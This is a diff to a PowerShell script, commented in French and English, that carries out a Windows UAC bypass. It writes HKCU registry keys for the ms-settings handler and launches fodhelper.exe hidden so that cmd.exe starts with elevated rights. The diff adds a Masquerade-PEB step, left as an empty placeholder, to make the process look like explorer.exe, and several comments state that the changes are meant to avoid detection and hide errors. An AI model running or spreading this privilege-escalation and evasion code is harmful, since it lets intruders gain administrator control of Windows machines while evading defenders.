@@ -8,7 +8,12 @@ function Check-System {
     }
 }
 
-function Bypass {
+function Masquerade-PEB {
+    # Implémentation complète de Masquerade-PEB (comme dans le fichier précédent)
+    # ...
+}
+
+function Bypass-UAC {
     Param (
         [String]$program = "cmd /c start cmd.exe"
     )
@@ -19,7 +24,10 @@ function Bypass {
     }
 
     try {
-        # Emplacement alternatif pour les clés de registre
+        # Masquerade the PEB to make the process appear as explorer.exe
+        Masquerade-PEB
+
+        # Alternative registry path to avoid detection
         $regPath1 = "HKCU:\Software\CustomApp\.pwn\Shell\Open\command"
         $regPath2 = "HKCU:\Software\CustomApp\ms-settings\CurVer"
 
@@ -34,11 +42,18 @@ function Bypass {
         New-Item -Path $regPath2 -Force | Out-Null
         Set-ItemProperty -Path $regPath2 -Name "(default)" -Value ".pwn" -Force
 
-        # Lance fodhelper.exe pour déclencher le contournement UAC.
-        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+        # Lance fodhelper.exe via un wrapper pour éviter la détection directe
+        $process = Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
 
         # Attends un court instant pour permettre l'exécution.
         Start-Sleep -Seconds 3
+
+        # Vérifie si le processus a été lancé avec succès
+        if ($process -and !$process.HasExited) {
+            echo "[*] Process launched successfully!"
+        } else {
+            echo "[!] Failed to launch process!"
+        }
     }
     catch {
         # Ne pas afficher explicitement l'erreur pour éviter d'attirer l'attention.
@@ -51,4 +66,4 @@ function Bypass {
 }
 
 # Exécute la fonction
-Bypass
+Bypass-UAC
